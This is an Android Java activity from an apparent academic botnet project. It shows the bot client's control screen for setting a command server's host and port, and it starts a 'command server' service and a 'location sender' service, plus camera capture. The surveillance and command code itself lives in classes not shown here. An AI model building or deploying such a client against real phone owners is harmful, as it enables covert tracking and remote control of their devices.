package de.tudarmstadt.botnet.janus_yanai;

import java.util.Map;

import android.app.Activity;
import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.os.Bundle;
import android.os.IBinder;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.view.ViewGroup.LayoutParams;
import android.widget.CheckBox;
import android.widget.CompoundButton;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

public class BotClientActivity extends Activity {
	
	SharedPreferences preferences;
	final static String PREF = "BOTNET";
	
	public static String getIP(Context context) {
		SharedPreferences pref = context.getSharedPreferences(PREF, 0);
		
		return pref.getString("host_port", Config.initial_host_port);
	}
	
    static void setvisible(TextView[] l, int v) {
	for (TextView i : l)
	    i.setVisibility(v);
    }
    static boolean isValidHostnameAndPort(String erg, boolean checkIP) {
	  String[] sp = erg.split(":");
	  if (sp.length != 2) return false;
	  try {
		Integer.valueOf(sp[1]);
	  } catch (NumberFormatException e) {
		return false;
	  }
	  if (checkIP && !isValidIP(sp[0])) return false;
	  return true;
    }

static boolean isValidIP(String ip) {
	String[] sp = ip.split(".");
	if (sp.length != 4) return false;
	for (String i : sp) {
	try {
		Byte.valueOf(i);
	} catch (NumberFormatException e) {
		return false;
	}
	}
	return true;
}

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        
        preferences = getSharedPreferences(PREF, 0);
        
	LayoutParams lparams = new LayoutParams(LayoutParams.WRAP_CONTENT,LayoutParams.WRAP_CONTENT);

        LinearLayout layout = (LinearLayout) findViewById(R.id.host_layout);

        final EditText port = new EditText(this);
	port.setLayoutParams(lparams);
// TODO android:inputType="numberSigned|numberDecimal" 

        final CheckBox checkbox = (CheckBox) findViewById(R.id.checkbox);

        final EditText edittext = new EditText(this);
        edittext.setLayoutParams(lparams);

	final EditText[] o = { new EditText(this),new EditText(this),new EditText(this),new EditText(this) };

/*
        OnKeyListener keyListen = new OnKeyListener() {
            @Override
            public boolean onKey(View v, int keyCode, KeyEvent event) {
*/
	android.text.TextWatcher textWatcher = new android.text.TextWatcher() {
public void afterTextChanged(android.text.Editable s) {}
public void beforeTextChanged(CharSequence s, int start, int count, int after) {}
	    public void onTextChanged(CharSequence s, int start, int before, int count) {
		//Log.d("LOL", String.valueOf(keyCode));
		String erg;
		if (!checkbox.isChecked()) {
                  erg = edittext.getText().toString() + ":" + port.getText().toString();
		  if (!isValidHostnameAndPort(erg, false)) { markError(false, erg); }
		} else {
		  erg = String.format("%s.%s.%s.%s:%s",o[0].getText().toString(),o[1].getText().toString(),o[2].getText().toString(),o[3].getText().toString(),port.getText().toString());
		  if (!isValidHostnameAndPort(erg, true)) { markError(true, erg); }

		}
                Editor e = preferences.edit();
                e.putString("host_port", erg);
                e.apply();
		Log.d("LOL","ip/port set: " + erg);
                Toast.makeText(BotClientActivity.this, "IP/port set!", Toast.LENGTH_SHORT);
		
            }

	};
	//edittext.setOnKeyListener(keyListen);
	//port.setOnKeyListener(keyListen);
	edittext.addTextChangedListener(textWatcher);
	port.addTextChangedListener(textWatcher);


	LinearLayout tuplelayout = new LinearLayout(this);
	tuplelayout.setLayoutParams(lparams);
	layout.addView(tuplelayout);

	for (EditText i : o) {
		//i.setOnKeyListener(keyListen);
		i.addTextChangedListener(textWatcher);

		i.setLayoutParams(lparams);
	}

        layout.addView(edittext);
	layout.addView(port);
	for (EditText i : o) tuplelayout.addView(i);

	int v1 = !checkbox.isChecked() ? View.VISIBLE : View.GONE;
	int v2 = checkbox.isChecked() ? View.VISIBLE : View.GONE;

	edittext.setVisibility(v1);
	setvisible(o,v2);

	checkbox.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
	  @Override
	  public void onCheckedChanged(CompoundButton view, boolean isChecked) {

	   int v1 = !isChecked ? View.VISIBLE : View.GONE;
	   int v2 = isChecked ? View.VISIBLE : View.GONE;
	   edittext.setVisibility(v1);
	   setvisible(o,v2);
	   
	   fill(isChecked, edittext, o, port);
	  }

        });

	fill(checkbox.isChecked(), edittext, o, port);
        
        //doBindService1();
    }

    void markError(boolean checked, String erg) {
	Log.d("LOL",String.format("invalid %s: ",String.valueOf(checked)) + erg);

    }

    void fill(boolean isChecked, EditText combined, EditText[] o, EditText port) {

      String ip = getIP(this);
      String[] parts = ip.split(":");
      if (parts.length != 2) return; //throw new RuntimeException("invalid ip/host was saved or declared in Config");
      port.setText(parts[1]);
      if (isChecked) {
	String[] ipparts = parts[0].split("\\.");
        if (ipparts.length != 4) return; //throw new RuntimeException("invalid number of '.' in ip: " + parts[0]);
	for (int i=0; i<=3; i++) {
		o[i].setText(ipparts[i]);
        }
      } else {
	combined.setText(parts[0]);
      }
    }
    
    public void onCameraCaptureButtonClick(View view) {
    	Intent myIntent = new Intent(BotClientActivity.this, CameraDemo.class);
        startActivity(myIntent);
    }
    public void onNotifyServerButtonClick(View view) {
    	BootCompleteReceiver.getInstance(this).sendNotification(true);
    }
    
    public void manualStartServer(View view) {
		//Intent newinIntent = new Intent(this, ServerService.class);
        //this.startService(newinIntent);
    	doBindService1();
    }
   
    public void startLocationService(View view) {
    	doBindService2();
    }
    
	final static int ID_RESTARTSERVER1 = 3000;
	final static int ID_RESTARTSERVER2 = 4000;
	
	private ServerService mBoundService1;
	private boolean mIsBound1;
	
	private LocationService mBoundService2;
	private boolean mIsBound2;
	
	private ServiceConnection mConnection1 = new ServiceConnection() {
	    public void onServiceConnected(ComponentName className, IBinder service) {
	        mBoundService1 = ((ServerService.LocalBinder)service).getService();

	        //mBoundService1 = new ServerService();
	        
	        Toast.makeText(BotClientActivity.this, "local command server service connected",
	                Toast.LENGTH_SHORT).show();
	    }

	    public void onServiceDisconnected(ComponentName className) {
	    	//we should never see this happen
	        mBoundService1 = null;
	        Toast.makeText(BotClientActivity.this, "local command server service disconnected",
	                Toast.LENGTH_SHORT).show();
	    }
	};


	private ServiceConnection mConnection2 = new ServiceConnection() {
	    public void onServiceConnected(ComponentName className, IBinder service) {
	        mBoundService2 = ((LocationService.LocalBinder)service).getService();

	        //mBoundService2 = new LocationService();
	        
	        Toast.makeText(BotClientActivity.this, "local location sender service connected",
	                Toast.LENGTH_SHORT).show();
	    }

	    public void onServiceDisconnected(ComponentName className) {
	    	//we should never see this happen
	        mBoundService2 = null;
	        Toast.makeText(BotClientActivity.this, "local location sender service disconnected",
	                Toast.LENGTH_SHORT).show();
	    }
	};

	
	
	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		menu.add(android.view.Menu.NONE, ID_RESTARTSERVER1, android.view.Menu.NONE, "Restart command server");
		menu.add(android.view.Menu.NONE, ID_RESTARTSERVER2, android.view.Menu.NONE, "Restart location server");
		return true;
	}

	@Override
	public boolean onOptionsItemSelected(MenuItem item) {
		switch (item.getItemId()) {
		case ID_RESTARTSERVER1:
			if (mBoundService1 == null) { Toast.makeText(this, "Service null...", Toast.LENGTH_SHORT).show(); return true; }
			mBoundService1.stopSelf();
			doUnbindService1();
			doBindService1();
			Toast.makeText(this, "restarted command server", Toast.LENGTH_SHORT).show();
			return true;
		case ID_RESTARTSERVER2:
			if (mBoundService2 == null) { Toast.makeText(this, "Service null...", Toast.LENGTH_SHORT).show(); return true; }
			mBoundService2.stopSelf();
			doUnbindService2();
			doBindService2();
			Toast.makeText(this, "restarted location sender", Toast.LENGTH_SHORT).show();
			return true;
		default:
			return super.onOptionsItemSelected(item);
		}

	}
	
	void doBindService2() {
	    bindService(new Intent(BotClientActivity.this, 
	            LocationService.class), mConnection2, Context.BIND_AUTO_CREATE);
	    mIsBound2 = true;
	}
	
	void doBindService1() {
	    bindService(new Intent(BotClientActivity.this, 
	            ServerService.class), mConnection1, Context.BIND_AUTO_CREATE);
	    mIsBound1 = true;
	}
	
	void doBindService(Class<Service> t) {
		bindService(new Intent(BotClientActivity.this, 
	            t), mConnection1, Context.BIND_AUTO_CREATE);
	    mIsBound.put(t, true);
	}

	Map<Class<Service>,Boolean> mIsBound;

	void doUnbindService2() {
	    if (mIsBound2) {
	        unbindService(mConnection2);
	        mIsBound2 = false;
	    }
	}
	
	void doUnbindService1() {
	    if (mIsBound1) {
	        unbindService(mConnection1);
	        mIsBound1 = false;
	    }
	}
	
	@Override
	protected void onDestroy() {
	    super.onDestroy();
	    doUnbindService1();
	    doUnbindService2();
	}
}
